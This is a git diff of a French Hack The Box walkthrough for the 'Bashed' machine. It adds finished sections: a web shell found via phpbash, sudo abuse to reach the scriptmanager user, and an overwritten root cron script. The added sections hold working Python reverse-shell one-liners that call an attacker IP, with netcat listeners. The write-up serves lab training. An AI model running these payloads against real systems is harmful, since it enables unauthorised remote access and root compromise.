@@ -5,13 +5,13 @@ machine: Bashed
 os: Linux
 difficulty: Easy
 date: 16/11/2025
-status: en-cours
+status: terminé
 ---
 ---
 # Bashed
 
 > [!summary] Résumé rapide  
-> (Compléter après la machine : vecteur d’entrée + privesc)
+> Bashed est une machine Facile de Hack The Box. Un serveur web tourne avec un script php dangereux qui donne un accès direct à un shell utilisateur une fois qu'il est trouvé. Une fois sur la machine, un attaquant peut pivoter directement vers un second utilisateur afin de modifier un script exécuté périodiquement par root. Ce comportement permet alors d'obtenir un shell root en réécrivant le script. 
 
 ---
 
@@ -22,7 +22,7 @@ status: en-cours
 - **Difficulty :** Easy
 - **Auteur :** Arrexel
 - **Date :** 16/11/2025
-- **Statut :** En cours
+- **Statut :** Terminée
 
 ---
 ## 🟦 1. Reconnaissance réseau
@@ -133,6 +133,17 @@ On se dirige juste sur http://bashed.htb/dev/phpbash.php
 
 **Résultat :**  On a un reverse shell sur bashed.htb.
 
+On peut Stabiliser le shell en créant une connexion via netcat :
+Côté attaquant :
+```bash
+nc -lnvp 1337
+```
+
+Côté serveur :
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
 **Accès obtenu :**  
 - User :  www-data
 - Contexte :  shell
@@ -160,11 +171,7 @@ On a accès au flag utilisateur dans `/home/arrexel`.
 
 ### 5.1 Mouvement latéral
 
-L'utilisateur `www-data` peut exécuter des commandes en tant que `scriptmanager` sans mot de passe :
-```bash
-sudo -u scriptmanager whoami
-scriptmanager
-```
+#### Exploration du fichier /var/www
 
 On peut accéder au dossier `/var/www/html/php` pour lire le contenu du fichier `sendMail.php`
 
@@ -195,44 +202,90 @@ $email = "yourmail@here.com"; //<-- Your email
 ?>
 ```
 
-> [!info] Linux
+Mais la piste semble s'arrêter ici.
 
-- whoami  
-- id
-- sudo -l
-- find / -perm -4000 -type f 2>/dev/null
+#### Vérifications commandes sudo
 
-**Infos importantes :**
+L'utilisateur `www-data` peut exécuter des commandes en tant que `scriptmanager` sans mot de passe :
+
+```bash
+sudo -l
+```
+
+```bash
+Matching Defaults entries for www-data on bashed:  
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+  
+User www-data may run the following commands on bashed:  
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+```
+
+```bash
+sudo -u scriptmanager whoami
+scriptmanager
+```
+
+On peut donc devenir `scriptmanager` avec la commande suivante :
+```bash
+sudo -u scriptmanager bash -i
+```
+
+L'utilisateur `scriptmanager` a un accès à `/scripts` que `www-data` n'a pas :
+
+```bash
+ls -l /scripts
+```
+
+```bash
+total 8  
+-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py  
+-rw-r--r-- 1 root root 12 Nov 16 01:02 test.txt
+```
+
+Le contenu de script.py :
+```python
+f = open("test.txt", "w")  
+f.write("testing 123!")  
+f.close
+```
+
+Hypothèse : Si l'utilisateur root exécute périodiquement le script `test.py`, on pourrait obtenir un shell root.
+
+On peut confirmer l'hypothèse en modifiant le script Python en remplaçant "testing 123!" par une autre chaîne : root exécute le script toutes les minutes.
 
 ---
 
 ## 🟦 6. Élévation de privilèges
 
 ### Méthode retenue :
-- Type :  
-- Pourquoi ça marche :  
-- Commande(s) / manip(s) :
 
-**Contexte final :** root / administrator
+Remplacement du script test.py par :
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+```
+
+et côté attaquant :
+```bash
+nc -lnvp 31337
+```
+
+- Type :  Reverse Shell
+- Pourquoi ça marche :  root exécute un fichier que nous pouvons écrire.
+
+**Contexte final :** root shell
 
 ---
 
 ## 🟦 7. Résumé final
 
 > [!success] Ce que j’ai appris  
--  
--  
+-  Création de reverse shell avec `netcat`
+-  Énumération sous Linux
+-  Mouvement latéral
+-  Recherche de dossier et scripts non standards sur le système
 
 > [!failure] Ce que j’ai raté / À éviter  
--  
--  
+-  Passer trop de temps à essayer de trouver un crontab alors qu'un test suffit parfois à valider une hypothèse.
 
 > [!attention] Patterns utiles  
--  
-
----
-
-## 🟦 8. Annexes
-- Captures
-- Snippets
-- Fichiers intéressants
+-  Commande `sudo -l` pour voir les commandes exécutables potentiellement sans mot de passe
